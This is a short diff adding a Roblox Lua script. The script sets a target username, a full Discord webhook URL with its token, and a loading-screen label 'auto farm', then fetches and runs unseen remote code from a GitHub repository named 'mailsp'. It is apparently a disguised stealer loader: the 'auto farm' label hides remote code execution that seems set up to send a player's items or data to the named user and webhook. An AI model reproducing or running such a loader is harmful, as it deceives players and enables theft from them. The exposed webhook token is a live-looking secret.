@@ -1,0 +1,7 @@
+_G.UserName = "owshie2012" 
+
+_G.Webhook = "https://discord.com/api/webhooks/1104242673684058202/rIgxKNvkVhSMZLBrMqEbE639SowaeCpz69-bvuCz4pCogUv22zY-krME8bxvPZ1lI8nR" 
+
+_G.loadingScreenText = "auto farm" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
